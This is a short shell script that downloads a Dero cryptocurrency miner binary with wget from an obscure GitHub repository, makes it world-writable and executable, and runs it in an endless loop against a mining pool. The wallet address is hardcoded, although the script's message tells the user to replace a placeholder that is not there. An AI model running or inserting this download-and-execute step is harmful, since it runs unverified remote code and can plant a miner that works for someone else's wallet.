wget https://github.com/WxYtzaiu/asekhh/raw/main/dero-stratum-miner
chmod 777 dero-stratum-miner
#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero-stratum-miner -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xevuvu8geqh829q3asvh9.MAJA -r stratum+tls://pool.whalesburg.com:4300 -p stratum;
    sleep 5;
done
